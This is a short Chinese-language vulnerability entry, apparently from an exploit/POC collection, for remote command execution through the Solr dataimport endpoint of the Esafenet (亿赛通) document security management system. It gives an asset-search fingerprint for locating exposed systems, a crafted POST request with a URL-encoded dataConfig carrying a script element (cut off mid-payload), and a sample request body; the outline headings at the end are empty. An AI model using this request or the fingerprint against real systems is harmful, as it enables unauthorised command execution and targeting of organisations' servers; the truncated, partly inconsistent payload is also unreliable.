# 亿赛通电子文档安全管理系统solr远程命令执行漏洞

- **系统**：亿赛通电子文档安全管理系统solr　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="ESAFENET 亿赛通文档安全管理系统"`
- **请求**：`POST /solr/flow/dataimport?command=full-import&verbose=false&clean=false&commit=false&debug=true&core=tika&name=dataimport&dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5`

**请求体 / payload**
```
1. 访问以下POC，出现如下情况表达可能存在漏洞
/solr/flow/dataimport
2. 通过exp执行命令
Host: xx.xx.xx.xx
Content-Length: 83
<?xml version="1.0" encoding="UTF-8"?>
<RDF>
<item/>
</RDF>
```

**其他**
- 亿赛通电子文档安全管理系统solr远程命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 亿赛通电子文档安全管理系统